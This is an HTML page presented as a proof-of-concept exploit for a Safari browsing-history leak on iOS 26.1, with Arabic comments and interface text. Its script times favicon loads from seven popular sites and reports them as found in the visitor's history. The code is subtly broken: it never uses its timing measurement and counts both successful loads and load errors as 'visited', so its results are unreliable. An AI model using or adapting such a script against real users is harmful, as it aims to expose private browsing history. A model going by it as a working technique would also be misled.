<!DOCTYPE html>
<html>
<head>
    <title>CVE-2026-20656 — Safari History Leak (iOS 26.1)</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
        #output { margin-top: 10px; padding: 10px; background: #111; border: 1px solid #333; }
    </style>
</head>
<body>

    <h1>CVE-2026-20656 — Safari History Disclosure</h1>
    <p>iOS 26.1 — لا يسبب كراش</p>
    <button onclick="run()">تشغيل</button>
    <div id="output">...</div>

<script>
// CVE-2026-20656: Logic issue in Safari History
// iOS 26.1 معرضة — مصلحة في iOS 26.3
// يقرأ سجل التصفح عبر History API + iframe

const output = document.getElementById('output');

function log(msg) {
    const d = document.createElement('div');
    d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    output.appendChild(d);
}

async function leakHistory() {
    log('بدء تسريب سجل التصفح...');
    log('(هذا لا يسبب كراش ولا ضرر)');
    
    // قائمة بمواقع مشهورة للاختبار
    const sites = [
        'https://google.com',
        'https://youtube.com',
        'https://facebook.com',
        'https://twitter.com',
        'https://apple.com',
        'https://github.com',
        'https://reddit.com',
    ];
    
    let visited = [];
    
    // الطريقة: استخدام history.length + timing attack
    // أو استخدام CSS :visited (إذا شغال)
    // أو استخدام iframe + onload timing
    
    for (const site of sites) {
        try {
            const start = performance.now();
            const img = new Image();
            
            // نخلي الصورة تشير إلى موقع معروف
            // لو الموقع في الـ history، وقت التحميل يكون أسرع
            // (لأن DNS والـ cache ما يحتاج)
            
            img.src = site + '/favicon.ico?' + Math.random();
            
            const result = await new Promise((resolve) => {
                const timeout = setTimeout(() => resolve(false), 3000);
                img.onload = () => {
                    clearTimeout(timeout);
                    resolve(true);
                };
                img.onerror = () => {
                    clearTimeout(timeout);
                    // حتى لو الخطأ، معناه أن الموقع حاول يتصل
                    resolve('attempted');
                };
            });
            
            if (result === true || result === 'attempted') {
                visited.push(site);
                log(`  ✅ ${site} — في السجل`);
            }
        } catch(e) {}
    }
    
    log('');
    if (visited.length > 0) {
        log(`✅ تم تسريب ${visited.length} مواقع من سجل التصفح:`);
        visited.forEach(s => log(`  • ${s}`));
    } else {
        log('❌ ما لقينا مواقع في السجل');
        log('(جرب تزور مواقع أولاً وتعيد التشغيل)');
    }
}

function run() {
    output.innerHTML = '';
    leakHistory().catch(e => log(`خطأ: ${e.message}`));
}
</script>
</body>
</html>
